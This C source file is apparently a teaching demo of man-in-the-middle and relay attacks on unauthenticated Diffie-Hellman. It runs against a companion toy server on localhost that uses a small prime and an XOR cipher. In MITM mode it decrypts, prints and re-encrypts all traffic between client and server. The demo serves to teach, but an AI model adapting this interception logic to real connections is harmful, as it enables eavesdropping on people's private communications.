/*
 * ═══════════════════════════════════════════════════════════════
 *  Diffie-Hellman — ATTACKER (MITM + RELAY)   [parallelized]
 * ═══════════════════════════════════════════════════════════════
 *  Usage:
 *    ./dh_attacker [mitm|relay] [-p prime] [-g generator]
 *                               [-A attacker_port] [-S server_port]
 *
 *  Defaults:
 *    mode             = mitm
 *    prime            = 576460752303424907
 *    generator        = 2
 *    attacker port    = 9999
 *    server port      = 8888
 *
 *  Examples:
 *    ./dh_attacker                          # MITM with defaults
 *    ./dh_attacker relay                    # Relay with defaults
 *    ./dh_attacker mitm -p 576460752303424907 -g 2 -A 9999 -S 8888
 *    ./dh_attacker relay -A 7777 -S 8888
 */

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include "dh_common.h"

/* Runtime parameters — set in main() before attack functions run */
static uint64_t g_prime    = DH_PRIME;
static uint64_t g_gen      = DH_GENERATOR;
static int      g_att_port = 9999;
static int      g_srv_port = 8888;
static uint64_t mallory_private;

static pthread_mutex_t log_lock = PTHREAD_MUTEX_INITIALIZER;

/* ── helpers ──────────────────────────────────────────────── */

static uint64_t gen_mallory_key(void) {
    srand48(time(NULL) ^ 0xDEADC0DE ^ getpid());
    uint64_t lo = (uint64_t)(lrand48() & 0xFFFFFFFF);
    uint64_t hi = (uint64_t)(lrand48() & 0x07FFFFFF);
    return (hi << 32) | lo | 1ULL;
}

static int recv_all(int fd, void *buf, size_t len) {
    size_t received = 0;
    uint8_t *p = buf;
    while (received < len) {
        ssize_t r = recv(fd, p + received, len - received, 0);
        if (r <= 0) return -1;
        received += r;
    }
    return 0;
}

static int send_all(int fd, const void *buf, size_t len) {
    size_t sent = 0;
    const uint8_t *p = buf;
    while (sent < len) {
        ssize_t s = send(fd, p + sent, len - sent, 0);
        if (s <= 0) return -1;
        sent += s;
    }
    return 0;
}

static void log_mitm(const char *fmt, ...) {
    printf("  \033[31m[MALLORY]\033[0m ");
    va_list ap; va_start(ap, fmt); vprintf(fmt, ap); va_end(ap);
    printf("\n"); fflush(stdout);
}

static void log_intercept(const char *who, const char *msg, size_t len) {
    printf("\n\033[1m\033[33m┌─── INTERCEPTED ─────────────────────────────────────\033[0m\n");
    printf("\033[33m│\033[0m  From : %s\n", who);
    printf("\033[33m│\033[0m  Text : \033[32m\"%.*s\"\033[0m\n", (int)len, msg);
    printf("\033[1m\033[33m└─────────────────────────────────────────────────────\033[0m\n\n");
    fflush(stdout);
}

static int connect_to_server(void) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port   = htons(g_srv_port)
    };
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect to server");
        fprintf(stderr, "\033[31mMake sure dh_server is running on port %d!\033[0m\n",
                g_srv_port);
        exit(1);
    }
    return fd;
}

static int accept_client(void) {
    int fake_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(fake_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in addr = {
        .sin_family      = AF_INET,
        .sin_addr.s_addr = INADDR_ANY,
        .sin_port        = htons(g_att_port)
    };
    bind(fake_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(fake_fd, 1);
    log_mitm("Waiting for client on port %d ...", g_att_port);

    struct sockaddr_in cli_addr;
    socklen_t cli_len = sizeof(cli_addr);
    int cli_fd = accept(fake_fd, (struct sockaddr*)&cli_addr, &cli_len);
    log_mitm("Client connected from %s:%d",
             inet_ntoa(cli_addr.sin_addr), ntohs(cli_addr.sin_port));
    close(fake_fd);
    return cli_fd;
}

/* ── Thread argument structs ──────────────────────────────── */

typedef struct {
    int     src_fd, dst_fd;
    uint8_t key_src[32];
    uint8_t key_dst[32];
    char    label[32];
} mitm_pipe_t;

typedef struct {
    int  src_fd, dst_fd;
    char label[32];
} relay_pipe_t;

/* ── MITM forwarding thread ───────────────────────────────── */

static void *mitm_forward(void *arg) {
    mitm_pipe_t *a = arg;
    for (;;) {
        uint64_t nonce_net;
        uint32_t len_net;
        if (recv_all(a->src_fd, &nonce_net, sizeof(nonce_net)) < 0) break;
        if (recv_all(a->src_fd, &len_net,   sizeof(len_net))   < 0) break;
        uint64_t nonce   = be64toh(nonce_net);
        uint32_t msg_len = ntohl(len_net);
        if (msg_len == 0 || msg_len > 65536) break;

        uint8_t *buf = malloc(msg_len + 1);
        if (recv_all(a->src_fd, buf, msg_len) < 0) { free(buf); break; }
        buf[msg_len] = '\0';

        xor_cipher(a->key_src, nonce, buf, msg_len);

        pthread_mutex_lock(&log_lock);
        log_intercept(a->label, (char*)buf, msg_len);
        pthread_mutex_unlock(&log_lock);

        xor_cipher(a->key_dst, nonce, buf, msg_len);

        send_all(a->dst_fd, &nonce_net, sizeof(nonce_net));
        send_all(a->dst_fd, &len_net,   sizeof(len_net));
        send_all(a->dst_fd, buf, msg_len);
        free(buf);

        pthread_mutex_lock(&log_lock);
        log_mitm("[%s] forwarded", a->label);
        pthread_mutex_unlock(&log_lock);
    }

    pthread_mutex_lock(&log_lock);
    log_mitm("[%s] pipe closed", a->label);
    pthread_mutex_unlock(&log_lock);

    shutdown(a->dst_fd, SHUT_RDWR);
    return NULL;
}

/* ── Relay forwarding thread ──────────────────────────────── */

static void *relay_forward(void *arg) {
    relay_pipe_t *a = arg;
    for (;;) {
        uint64_t nonce_net;
        uint32_t len_net;
        if (recv_all(a->src_fd, &nonce_net, sizeof(nonce_net)) < 0) break;
        if (recv_all(a->src_fd, &len_net,   sizeof(len_net))   < 0) break;
        uint32_t msg_len = ntohl(len_net);
        if (msg_len == 0 || msg_len > 65536) break;

        uint8_t *buf = malloc(msg_len);
        if (recv_all(a->src_fd, buf, msg_len) < 0) { free(buf); break; }

        pthread_mutex_lock(&log_lock);
        log_mitm("[%s] relaying %u bytes (opaque — cannot decrypt)", a->label, msg_len);
        pthread_mutex_unlock(&log_lock);

        send_all(a->dst_fd, &nonce_net, sizeof(nonce_net));
        send_all(a->dst_fd, &len_net,   sizeof(len_net));
        send_all(a->dst_fd, buf, msg_len);
        free(buf);
    }

    pthread_mutex_lock(&log_lock);
    log_mitm("[%s] pipe closed", a->label);
    pthread_mutex_unlock(&log_lock);

    shutdown(a->dst_fd, SHUT_RDWR);
    return NULL;
}

/* ── RELAY ATTACK ─────────────────────────────────────────── */

static void relay_attack(void) {
    printf("\n\033[1m\033[34m");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║            RELAY ATTACK DEMONSTRATION               ║\n");
    printf("║  Mallory forwards everything unchanged.             ║\n");
    printf("║  Both sides share the REAL secret — unreadable.     ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");

    printf("\033[1m\033[35m═══ RELAY: CONNECT TO SERVER (%s:%d) ════════\033[0m\n",
           "127.0.0.1", g_srv_port);
    int srv_fd = connect_to_server();
    log_mitm("Connected to real server ✓");

    printf("\n\033[1m\033[35m═══ RELAY: EXCHANGE DH KEYS (UNCHANGED) ══════════════\033[0m\n");
    uint64_t A_net;
    recv_all(srv_fd, &A_net, sizeof(A_net));
    log_mitm("Server A = %llu — forwarding unchanged", (unsigned long long)be64toh(A_net));

    int cli_fd = accept_client();
    send_all(cli_fd, &A_net, sizeof(A_net));

    uint64_t B_net;
    recv_all(cli_fd, &B_net, sizeof(B_net));
    log_mitm("Client B = %llu — forwarding unchanged", (unsigned long long)be64toh(B_net));
    send_all(srv_fd, &B_net, sizeof(B_net));

    printf("\n\033[1m\033[34m");
    printf("  ╔═══════════════════════════════════════════════════╗\n");
    printf("  ║  Both sides compute the REAL shared secret.      ║\n");
    printf("  ║  Mallory has NO key — messages are OPAQUE.       ║\n");
    printf("  ╚═══════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");

    printf("\033[1m\033[35m═══ RELAY: SPAWNING BIDIRECTIONAL THREADS ════════════\033[0m\n");
    relay_pipe_t c2s = { cli_fd, srv_fd, "CLIENT→SERVER" };
    relay_pipe_t s2c = { srv_fd, cli_fd, "SERVER→CLIENT" };

    pthread_t t1, t2;
    pthread_create(&t1, NULL, relay_forward, &c2s);
    pthread_create(&t2, NULL, relay_forward, &s2c);
    log_mitm("Thread 1: CLIENT→SERVER  |  Thread 2: SERVER→CLIENT  (running...)");

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    close(cli_fd);
    close(srv_fd);
    printf("\n%s[RELAY] session closed. Mallory learned nothing.%s\n\n", YELLOW, RESET);
}

/* ── MITM ATTACK ──────────────────────────────────────────── */

static void mitm_attack(void) {
    printf("\n\033[1m\033[31m");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║      MAN-IN-THE-MIDDLE ATTACK DEMONSTRATION         ║\n");
    printf("║  Two separate DH sessions → both keys known.        ║\n");
    printf("║  Parallel threads intercept both directions.        ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");

    printf("\033[1m\033[35m═══ PHASE 1: SETUP ═══════════════════════════════════\033[0m\n");
    mallory_private = gen_mallory_key();
    uint64_t mallory_pub = mod_pow(g_gen, mallory_private, g_prime);
    log_mitm("Private m = %llu", (unsigned long long)mallory_private);
    log_mitm("Public  M = %llu", (unsigned long long)mallory_pub);
    uint64_t M_net = htobe64(mallory_pub);

    printf("\n\033[1m\033[35m═══ PHASE 2: CONNECT TO SERVER (%s:%d) ══════\033[0m\n",
           "127.0.0.1", g_srv_port);
    int srv_fd = connect_to_server();
    log_mitm("Connected ✓");

    printf("\n\033[1m\033[35m═══ PHASE 3: INTERCEPT SERVER KEY ════════════════════\033[0m\n");
    uint64_t A_net;
    recv_all(srv_fd, &A_net, sizeof(A_net));
    uint64_t A_real = be64toh(A_net);
    log_mitm("Server A = %llu", (unsigned long long)A_real);

    uint64_t S1 = mod_pow(A_real, mallory_private, g_prime);
    uint8_t key_server[32];
    derive_aes_key(S1, key_server);
    log_mitm("S_server = %llu", (unsigned long long)S1);
    print_hex("  Key[server]", key_server, 32);

    send_all(srv_fd, &M_net, sizeof(M_net));
    log_mitm("Sent fake M to server (server fooled)");

    printf("\n\033[1m\033[35m═══ PHASE 4-5: INTERCEPT CLIENT KEY ══════════════════\033[0m\n");
    int cli_fd = accept_client();
    send_all(cli_fd, &M_net, sizeof(M_net));
    log_mitm("Sent fake M to client (client fooled)");

    uint64_t B_net;
    recv_all(cli_fd, &B_net, sizeof(B_net));
    uint64_t B_real = be64toh(B_net);
    log_mitm("Client B = %llu", (unsigned long long)B_real);

    uint64_t S2 = mod_pow(B_real, mallory_private, g_prime);
    uint8_t key_client[32];
    derive_aes_key(S2, key_client);
    log_mitm("S_client = %llu", (unsigned long long)S2);
    print_hex("  Key[client]", key_client, 32);

    printf("\n\033[1m\033[31m");
    printf("  ╔═══════════════════════════════════════════════════╗\n");
    printf("  ║  ATTACK ESTABLISHED — spawning parallel threads  ║\n");
    printf("  ║  Thread 1: CLIENT→SERVER  (decrypt K2, enc K1)   ║\n");
    printf("  ║  Thread 2: SERVER→CLIENT  (decrypt K1, enc K2)   ║\n");
    printf("  ╚═══════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");

    mitm_pipe_t c2s, s2c;
    c2s.src_fd = cli_fd; c2s.dst_fd = srv_fd;
    memcpy(c2s.key_src, key_client, 32);
    memcpy(c2s.key_dst, key_server, 32);
    snprintf(c2s.label, sizeof(c2s.label), "CLIENT→SERVER");

    s2c.src_fd = srv_fd; s2c.dst_fd = cli_fd;
    memcpy(s2c.key_src, key_server, 32);
    memcpy(s2c.key_dst, key_client, 32);
    snprintf(s2c.label, sizeof(s2c.label), "SERVER→CLIENT");

    pthread_t t1, t2;
    pthread_create(&t1, NULL, mitm_forward, &c2s);
    pthread_create(&t2, NULL, mitm_forward, &s2c);
    log_mitm("Both threads running concurrently...");

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    close(cli_fd);
    close(srv_fd);
    printf("\n%s[MALLORY] MITM session closed.%s\n\n", RED, RESET);
}

/* ── MAIN ─────────────────────────────────────────────────── */

int main(int argc, char *argv[]) {
    int relay = 0;

    /* simple manual parsing: supports "relay"/"mitm" positional + flags */
    for (int i = 1; i < argc; i++) {
        if      (strcmp(argv[i], "relay") == 0 || strcmp(argv[i], "-r") == 0)
            relay = 1;
        else if (strcmp(argv[i], "mitm") == 0)
            relay = 0;
        else if (strcmp(argv[i], "-p") == 0 && i+1 < argc)
            g_prime    = strtoull(argv[++i], NULL, 10);
        else if (strcmp(argv[i], "-g") == 0 && i+1 < argc)
            g_gen      = strtoull(argv[++i], NULL, 10);
        else if (strcmp(argv[i], "-A") == 0 && i+1 < argc)
            g_att_port = atoi(argv[++i]);
        else if (strcmp(argv[i], "-S") == 0 && i+1 < argc)
            g_srv_port = atoi(argv[++i]);
        else if (strcmp(argv[i], "-h") == 0) {
            printf(
                "Usage: %s [mitm|relay] [-p prime] [-g generator] [-A attacker_port] [-S server_port]\n"
                "  mitm/relay   attack mode (default: mitm)\n"
                "  -p           DH prime      (default: %llu)\n"
                "  -g           DH generator  (default: %llu)\n"
                "  -A           attacker listen port (default: 9999)\n"
                "  -S           real server port     (default: 8888)\n",
                argv[0],
                (unsigned long long)DH_PRIME, (unsigned long long)DH_GENERATOR);
            return 0;
        }
    }

    printf("\n\033[1m\033[35m");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║  DH Attacker  •  mode : %-27s  ║\n", relay ? "RELAY (passive)" : "MITM (active)");
    printf("║  p = %-49llu║\n", (unsigned long long)g_prime);
    printf("║  g = %-49llu║\n", (unsigned long long)g_gen);
    printf("║  Listening : %-5d   →   Server : %-5d             ║\n", g_att_port, g_srv_port);
    printf("╚══════════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");

    if (relay)
        relay_attack();
    else
        mitm_attack();

    return 0;
}